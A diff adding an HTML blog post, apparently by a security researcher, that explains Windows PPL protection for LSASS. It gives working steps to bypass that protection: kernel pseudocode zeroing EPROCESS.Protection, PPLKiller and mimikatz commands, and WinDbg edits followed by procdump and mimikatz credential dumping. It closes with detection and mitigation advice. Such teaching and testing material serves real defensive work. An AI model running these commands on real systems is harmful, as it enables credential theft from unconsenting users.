@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Bypassing PPL Protection and Dumping LSASS Data - Shravan Kumar Sheri</title>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="Learn about Windows PPL protection mechanism for LSASS, how EPROCESS.Protection works, and techniques for bypassing these protections for credential extraction.">
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+	<style>
+		* { box-sizing: border-box; }
+		body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; margin: 0; padding: 0; line-height: 1.8; color: #333; }
+
+		.progress-bar-container { position: fixed; top: 0; left: 0; width: 100%; height: 4px; background: #e9ecef; z-index: 1001; }
+		.progress-bar-fill { height: 100%; background: linear-gradient(90deg, #eb3349, #f45c43); width: 0%; transition: width 0.1s; }
+
+		.navbar { background-color: #1a1a2e !important; padding: 15px 0; box-shadow: 0 2px 10px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 1000; }
+		.navbar-brand { color: #fff !important; font-size: 22px; font-weight: 600; }
+		.nav-link { color: rgba(255,255,255,0.9) !important; font-size: 16px; margin-left: 20px; transition: color 0.3s; }
+		.nav-link:hover { color: #4a9eff !important; }
+
+		.article-header { background: linear-gradient(135deg, #eb3349 0%, #f45c43 100%); color: #fff; padding: 80px 0; }
+		.article-header .container { max-width: 800px; }
+		.back-link { color: rgba(255,255,255,0.9); text-decoration: none; display: inline-flex; align-items: center; margin-bottom: 30px; font-size: 14px; transition: color 0.3s; }
+		.back-link:hover { color: #fff; text-decoration: none; }
+		.back-link i { margin-right: 8px; }
+		.article-category { display: inline-block; padding: 6px 16px; background: rgba(255,255,255,0.2); border-radius: 20px; font-size: 12px; font-weight: 600; text-transform: uppercase; margin-bottom: 20px; }
+		.article-title { font-size: 42px; font-weight: 700; margin-bottom: 20px; line-height: 1.2; }
+		.article-meta { display: flex; flex-wrap: wrap; gap: 20px; font-size: 14px; opacity: 0.9; }
+		.article-meta span { display: flex; align-items: center; }
+		.article-meta i { margin-right: 8px; }
+
+		.article-content { max-width: 800px; margin: 0 auto; padding: 60px 20px; }
+		.article-body { background: #fff; padding: 50px; border-radius: 12px; box-shadow: 0 5px 30px rgba(0,0,0,0.08); }
+		.article-body h2 { font-size: 28px; font-weight: 700; color: #1a1a2e; margin-top: 40px; margin-bottom: 20px; padding-bottom: 10px; border-bottom: 2px solid #e9ecef; }
+		.article-body h2:first-child { margin-top: 0; }
+		.article-body h3 { font-size: 22px; font-weight: 600; color: #333; margin-top: 30px; margin-bottom: 15px; }
+		.article-body p { font-size: 18px; line-height: 1.8; margin-bottom: 20px; color: #444; }
+		.article-body ul, .article-body ol { margin-bottom: 20px; padding-left: 30px; }
+		.article-body li { font-size: 18px; line-height: 1.8; margin-bottom: 10px; color: #444; }
+		.article-body code { background: #f4f4f4; padding: 3px 8px; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 16px; color: #d63384; }
+		.article-body pre { background: #1a1a2e; color: #fff; padding: 25px; border-radius: 8px; overflow-x: auto; margin: 25px 0; }
+		.article-body pre code { background: none; color: #fff; padding: 0; }
+
+		.article-body blockquote { border-left: 4px solid #eb3349; padding: 20px 25px; margin: 25px 0; background: #f8f9fa; border-radius: 0 8px 8px 0; }
+		.article-body blockquote p { margin: 0; font-style: italic; color: #555; }
+
+		.toc { background: #f8f9fa; padding: 25px 30px; border-radius: 8px; margin-bottom: 40px; }
+		.toc h4 { font-size: 16px; font-weight: 700; color: #1a1a2e; margin-bottom: 15px; text-transform: uppercase; }
+		.toc ul { list-style: none; padding: 0; margin: 0; }
+		.toc li { margin-bottom: 10px; }
+		.toc a { color: #555; text-decoration: none; font-size: 15px; transition: color 0.3s; }
+		.toc a:hover { color: #eb3349; }
+
+		.share-section { margin-top: 50px; padding-top: 30px; border-top: 1px solid #e9ecef; }
+		.share-section h4 { font-size: 16px; font-weight: 600; color: #666; margin-bottom: 15px; }
+		.share-buttons { display: flex; gap: 10px; }
+		.share-btn { width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff; text-decoration: none; transition: transform 0.3s, opacity 0.3s; }
+		.share-btn:hover { transform: scale(1.1); color: #fff; text-decoration: none; }
+		.share-btn.twitter { background: #1da1f2; }
+		.share-btn.linkedin { background: #0077b5; }
+		.share-btn.copy { background: #6c757d; cursor: pointer; }
+
+		.author-box { display: flex; align-items: center; gap: 20px; background: #f8f9fa; padding: 25px; border-radius: 12px; margin-top: 40px; }
+		.author-avatar { width: 80px; height: 80px; background: linear-gradient(135deg, #eb3349 0%, #f45c43 100%); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 32px; font-weight: 700; flex-shrink: 0; }
+		.author-info h4 { font-size: 18px; font-weight: 700; color: #1a1a2e; margin-bottom: 5px; }
+		.author-info p { font-size: 14px; color: #666; margin: 0; }
+
+		.tags { margin-top: 30px; }
+		.tag { display: inline-block; padding: 6px 14px; background: #e9ecef; color: #495057; border-radius: 20px; font-size: 13px; margin-right: 8px; margin-bottom: 8px; text-decoration: none; transition: background 0.3s; }
+		.tag:hover { background: #dee2e6; text-decoration: none; color: #333; }
+
+		.warning-box { background: #fff3cd; border-left: 4px solid #ffc107; padding: 20px; border-radius: 0 8px 8px 0; margin: 25px 0; }
+		.warning-box p { margin: 0; color: #856404; }
+		.info-box { background: #e3f2fd; border-left: 4px solid #2196f3; padding: 20px; border-radius: 0 8px 8px 0; margin: 25px 0; }
+		.info-box p { margin: 0; color: #1565c0; }
+		.success-box { background: #d4edda; border-left: 4px solid #28a745; padding: 20px; border-radius: 0 8px 8px 0; margin: 25px 0; }
+		.success-box p { margin: 0; color: #155724; }
+
+		footer { background: #1a1a2e; color: #fff; padding: 30px 0; text-align: center; margin-top: 60px; }
+		footer p { margin: 0; opacity: 0.8; }
+
+		@media (max-width: 768px) {
+			.article-title { font-size: 28px; }
+			.article-body { padding: 30px 20px; }
+			.article-meta { flex-direction: column; gap: 10px; }
+			.author-box { flex-direction: column; text-align: center; }
+		}
+	</style>
+</head>
+<body>
+	<div class="progress-bar-container">
+		<div class="progress-bar-fill" id="progressBar"></div>
+	</div>
+
+	<nav class="navbar navbar-expand-lg navbar-dark">
+		<div class="container">
+			<a class="navbar-brand" href="../index.html">Shravan Kumar Sheri</a>
+			<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav">
+				<span class="navbar-toggler-icon"></span>
+			</button>
+			<div class="collapse navbar-collapse" id="navbarNav">
+				<ul class="navbar-nav ml-auto">
+					<li class="nav-item">
+						<a class="nav-link" href="../index.html">Home</a>
+					</li>
+					<li class="nav-item active">
+						<a class="nav-link" href="../blog.html">Blog</a>
+					</li>
+				</ul>
+			</div>
+		</div>
+	</nav>
+
+	<header class="article-header">
+		<div class="container">
+			<a href="../blog.html" class="back-link">
+				<i class="fas fa-arrow-left"></i> Back to Blog
+			</a>
+			<span class="article-category">Exploitation</span>
+			<h1 class="article-title">Bypassing PPL Protection and Dumping LSASS Data</h1>
+			<div class="article-meta">
+				<span><i class="far fa-calendar"></i> December 16, 2024</span>
+				<span><i class="far fa-clock"></i> 8 min read</span>
+				<span><i class="far fa-user"></i> Shravan Kumar Sheri</span>
+			</div>
+		</div>
+	</header>
+
+	<article class="article-content">
+		<div class="article-body">
+			<div class="toc">
+				<h4>Table of Contents</h4>
+				<ul>
+					<li><a href="#introduction">Introduction</a></li>
+					<li><a href="#what-is-ppl">What is PPL?</a></li>
+					<li><a href="#lsass-protection">LSASS Protection Mechanism</a></li>
+					<li><a href="#eprocess-protection">EPROCESS.Protection Field</a></li>
+					<li><a href="#bypass-techniques">Bypass Techniques</a></li>
+					<li><a href="#windbg-method">WinDbg Method</a></li>
+					<li><a href="#detection">Detection and Mitigation</a></li>
+					<li><a href="#conclusion">Conclusion</a></li>
+				</ul>
+			</div>
+
+			<h2 id="introduction">Introduction</h2>
+			<p>
+				The Local Security Authority Subsystem Service (LSASS) is a critical Windows process responsible for enforcing security policy, handling user authentication, and storing credentials in memory. Due to its importance, LSASS has become a prime target for attackers seeking to extract credentials from compromised systems.
+			</p>
+
+			<p>
+				To protect LSASS from unauthorized access, Microsoft introduced Protected Process Light (PPL), a security mechanism that restricts which processes can interact with protected processes. This article explores how PPL works and techniques used to bypass this protection.
+			</p>
+
+			<div class="warning-box">
+				<p><strong>Disclaimer:</strong> This information is provided for educational purposes and authorized security testing only. Unauthorized access to systems or credential theft is illegal.</p>
+			</div>
+
+			<h2 id="what-is-ppl">What is PPL?</h2>
+			<p>
+				Protected Process Light (PPL) is a security feature introduced in Windows 8.1 that extends the Protected Process (PP) concept from Windows Vista. PPL creates a hierarchy of protection levels that determine which processes can access or modify other processes.
+			</p>
+
+			<h3>Protection Hierarchy</h3>
+			<p>
+				PPL implements a strict hierarchy where processes can only interact with processes at the same or lower protection level:
+			</p>
+
+			<ul>
+				<li><strong>PsProtectedSignerWinTcb (6):</strong> Highest level - Windows TCB (Trusted Computing Base)</li>
+				<li><strong>PsProtectedSignerWindows (5):</strong> Critical Windows components</li>
+				<li><strong>PsProtectedSignerLsa (4):</strong> LSA protection level</li>
+				<li><strong>PsProtectedSignerAntimalware (3):</strong> Antimalware services</li>
+				<li><strong>PsProtectedSignerCodeGen (2):</strong> Code generation services</li>
+				<li><strong>PsProtectedSignerAuthenticode (1):</strong> Authenticode signed</li>
+				<li><strong>PsProtectedSignerNone (0):</strong> No protection</li>
+			</ul>
+
+			<h2 id="lsass-protection">LSASS Protection Mechanism</h2>
+			<p>
+				When Credential Guard is enabled or LSASS is configured to run as a protected process, it receives PPL protection at the <code>PsProtectedSignerLsa</code> level. This prevents:
+			</p>
+
+			<ul>
+				<li>Memory reading by unprivileged processes</li>
+				<li>Code injection attempts</li>
+				<li>Handle duplication from lower-privileged processes</li>
+				<li>Direct credential dumping tools like Mimikatz</li>
+			</ul>
+
+			<h3>Enabling LSASS Protection</h3>
+			<pre><code># Registry method to enable RunAsPPL
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
+
+# Verify LSASS protection status
+Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RunAsPPL</code></pre>
+
+			<div class="info-box">
+				<p><strong>Note:</strong> When RunAsPPL is enabled, LSASS runs with PPL protection, making traditional credential dumping techniques ineffective.</p>
+			</div>
+
+			<h2 id="eprocess-protection">EPROCESS.Protection Field</h2>
+			<p>
+				Each Windows process is represented by an EPROCESS structure in the kernel. The protection status is stored in the <code>Protection</code> field within this structure.
+			</p>
+
+			<h3>Protection Structure</h3>
+			<pre><code>// PS_PROTECTION structure (1 byte)
+typedef struct _PS_PROTECTION {
+    union {
+        UCHAR Level;
+        struct {
+            UCHAR Type : 3;      // PS_PROTECTED_TYPE (0-2)
+            UCHAR Audit : 1;    // Reserved
+            UCHAR Signer : 4;   // PS_PROTECTED_SIGNER (0-6)
+        };
+    };
+} PS_PROTECTION;
+
+// Protection Types:
+// PsProtectedTypeNone (0)           - No protection
+// PsProtectedTypeProtectedLight (1) - PPL
+// PsProtectedTypeProtected (2)      - Full PP</code></pre>
+
+			<h3>Finding the Offset</h3>
+			<p>
+				The Protection field offset varies by Windows version. Use WinDbg to find it:
+			</p>
+
+			<pre><code>// In WinDbg, dump EPROCESS structure
+dt nt!_EPROCESS
+
+// Find Protection offset (example output)
++0x87a Protection : _PS_PROTECTION
+
+// Offsets by version:
+// Windows 10 1903-21H2: 0x87a
+// Windows 11 22H2:      0x87a
+// Windows Server 2019:  0x6fa</code></pre>
+
+			<h2 id="bypass-techniques">Bypass Techniques</h2>
+			<p>
+				Several techniques exist to bypass PPL protection, ranging from kernel-level manipulation to exploiting vulnerable drivers.
+			</p>
+
+			<h3>Technique 1: Kernel Memory Modification</h3>
+			<p>
+				With kernel read/write primitives (from vulnerable drivers), the Protection field can be directly modified:
+			</p>
+
+			<pre><code>// Pseudocode for PPL bypass
+void DisablePPL(ULONG64 lsassEprocess) {
+    // Protection offset for Windows 10 21H2
+    ULONG protectionOffset = 0x87a;
+
+    // Read current protection value
+    UCHAR currentProtection = ReadKernelByte(lsassEprocess + protectionOffset);
+    printf("[*] Current Protection: 0x%02x\n", currentProtection);
+
+    // Set protection to 0 (no protection)
+    WriteKernelByte(lsassEprocess + protectionOffset, 0x00);
+    printf("[+] Protection disabled!\n");
+
+    // Now standard tools can dump LSASS
+}</code></pre>
+
+			<h3>Technique 2: Using PPLKiller</h3>
+			<p>
+				Tools like PPLKiller leverage vulnerable drivers to disable PPL protection:
+			</p>
+
+			<pre><code># PPLKiller usage (requires admin and vulnerable driver)
+PPLKiller.exe /disablePPL lsass
+
+# After disabling, use standard tools
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"</code></pre>
+
+			<h3>Technique 3: Mimidrv Approach</h3>
+			<p>
+				Mimikatz includes mimidrv.sys, a signed driver that can interact with protected processes:
+			</p>
+
+			<pre><code># Load mimidrv driver
+mimikatz # !+
+
+# Remove protection from LSASS
+mimikatz # !processprotect /process:lsass.exe /remove
+
+# Dump credentials
+mimikatz # sekurlsa::logonpasswords</code></pre>
+
+			<h2 id="windbg-method">WinDbg Method</h2>
+			<p>
+				Using kernel debugging, PPL can be bypassed by directly modifying the EPROCESS structure.
+			</p>
+
+			<h3>Step 1: Find LSASS Process</h3>
+			<pre><code>// List all processes
+!process 0 0
+
+// Find LSASS specifically
+!process 0 0 lsass.exe
+
+// Example output:
+PROCESS ffff8a0123456789
+    SessionId: 0  Cid: 0234  Peb: 00000000  ParentCid: 01bc
+    DirBase: 12345678  ObjectTable: ffffc00012345678  HandleCount: 1234
+    Image: lsass.exe</code></pre>
+
+			<h3>Step 2: Check Current Protection</h3>
+			<pre><code>// Get EPROCESS address from previous command
+// Check Protection field
+dt nt!_EPROCESS ffff8a0123456789 Protection
+
+// Or read the byte directly
+db ffff8a0123456789+0x87a L1
+
+// Example output showing PPL enabled:
+// 0x31 = Type:1 (PPL), Signer:3 (Lsa)</code></pre>
+
+			<h3>Step 3: Disable Protection</h3>
+			<pre><code>// Write 0 to Protection field to disable PPL
+eb ffff8a0123456789+0x87a 0
+
+// Verify the change
+db ffff8a0123456789+0x87a L1
+// Should show: 00
+
+// Continue execution
+g</code></pre>
+
+			<h3>Step 4: Dump Credentials</h3>
+			<pre><code># With PPL disabled, standard tools now work
+procdump -ma lsass.exe lsass.dmp
+
+# Or use Mimikatz directly
+mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"</code></pre>
+
+			<div class="warning-box">
+				<p><strong>Warning:</strong> Kernel debugging requires boot configuration changes and a connected debugger. This technique is primarily useful in lab environments or when physical access is available.</p>
+			</div>
+
+			<h2 id="detection">Detection and Mitigation</h2>
+			<p>
+				Organizations should implement multiple layers of defense against PPL bypass attacks:
+			</p>
+
+			<h3>Detection Methods</h3>
+			<ul>
+				<li><strong>Driver Load Monitoring:</strong> Alert on suspicious driver loads, especially known vulnerable drivers</li>
+				<li><strong>ETW Tracing:</strong> Monitor for PPL tampering via Event Tracing for Windows</li>
+				<li><strong>Kernel Integrity:</strong> Use Kernel Patch Protection (PatchGuard) monitoring</li>
+				<li><strong>LSASS Access:</strong> Monitor for unusual process access to LSASS</li>
+			</ul>
+
+			<h3>Mitigation Strategies</h3>
+			<ul>
+				<li><strong>Credential Guard:</strong> Enable Virtualization-Based Security for credential isolation</li>
+				<li><strong>HVCI:</strong> Enable Hypervisor-Protected Code Integrity to prevent unsigned driver loading</li>
+				<li><strong>Driver Blocklist:</strong> Deploy Microsoft's vulnerable driver blocklist</li>
+				<li><strong>Secure Boot:</strong> Ensure Secure Boot is enabled to protect boot chain</li>
+				<li><strong>LSA Protection:</strong> Enable RunAsPPL as a defense-in-depth measure</li>
+			</ul>
+
+			<pre><code># Enable Credential Guard via Group Policy
+# Computer Configuration > Administrative Templates > System > Device Guard
+# Enable "Turn On Virtualization Based Security"
+# Set "Credential Guard Configuration" to "Enabled with UEFI lock"
+
+# Verify Credential Guard status
+Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard</code></pre>
+
+			<h2 id="conclusion">Conclusion</h2>
+			<p>
+				PPL provides an important security boundary for protecting LSASS and other critical Windows processes. However, with kernel-level access, this protection can be bypassed by modifying the EPROCESS.Protection field.
+			</p>
+
+			<blockquote>
+				<p>Defense in depth is essential - PPL should be combined with Credential Guard, HVCI, and proper monitoring to create a robust credential protection strategy.</p>
+			</blockquote>
+
+			<h3>Key Takeaways</h3>
+			<ul>
+				<li>PPL creates a protection hierarchy preventing lower-privileged process access</li>
+				<li>LSASS runs as PPL when RunAsPPL or Credential Guard is enabled</li>
+				<li>The EPROCESS.Protection field controls process protection level</li>
+				<li>Kernel write primitives can disable PPL by zeroing the Protection field</li>
+				<li>Credential Guard with VBS provides stronger protection than PPL alone</li>
+			</ul>
+
+			<div class="tags">
+				<a href="#" class="tag">Windows</a>
+				<a href="#" class="tag">PPL</a>
+				<a href="#" class="tag">LSASS</a>
+				<a href="#" class="tag">Credential Dumping</a>
+				<a href="#" class="tag">Red Team</a>
+				<a href="#" class="tag">Kernel</a>
+			</div>
+
+			<div class="share-section">
+				<h4>Share this article</h4>
+				<div class="share-buttons">
+					<a href="#" class="share-btn twitter" onclick="shareTwitter()" title="Share on Twitter">
+						<i class="fab fa-twitter"></i>
+					</a>
+					<a href="#" class="share-btn linkedin" onclick="shareLinkedIn()" title="Share on LinkedIn">
+						<i class="fab fa-linkedin-in"></i>
+					</a>
+					<div class="share-btn copy" onclick="copyLink()" title="Copy link">
+						<i class="fas fa-link"></i>
+					</div>
+				</div>
+			</div>
+
+			<div class="author-box">
+				<div class="author-avatar">SK</div>
+				<div class="author-info">
+					<h4>Shravan Kumar Sheri</h4>
+					<p>Security Engineer & Researcher specializing in offensive security, red teaming, and exploit development.</p>
+				</div>
+			</div>
+		</div>
+	</article>
+
+	<footer>
+		<div class="container">
+			<p>&copy; 2025 Shravan Kumar Sheri - All Rights Reserved</p>
+		</div>
+	</footer>
+
+	<script>
+		window.addEventListener('scroll', () => {
+			const scrollTop = document.documentElement.scrollTop;
+			const scrollHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+			const progress = (scrollTop / scrollHeight) * 100;
+			document.getElementById('progressBar').style.width = progress + '%';
+		});
+
+		function shareTwitter() {
+			const url = encodeURIComponent(window.location.href);
+			const text = encodeURIComponent(document.title);
+			window.open(`https://twitter.com/intent/tweet?url=${url}&text=${text}`, '_blank');
+		}
+
+		function shareLinkedIn() {
+			const url = encodeURIComponent(window.location.href);
+			window.open(`https://www.linkedin.com/sharing/share-offsite/?url=${url}`, '_blank');
+		}
+
+		function copyLink() {
+			navigator.clipboard.writeText(window.location.href).then(() => {
+				alert('Link copied to clipboard!');
+			});
+		}
+
+		document.querySelectorAll('.toc a').forEach(link => {
+			link.addEventListener('click', function(e) {
+				e.preventDefault();
+				const targetId = this.getAttribute('href').slice(1);
+				const target = document.getElementById(targetId);
+				if (target) {
+					target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+				}
+			});
+		});
+	</script>
+</body>
+</html>
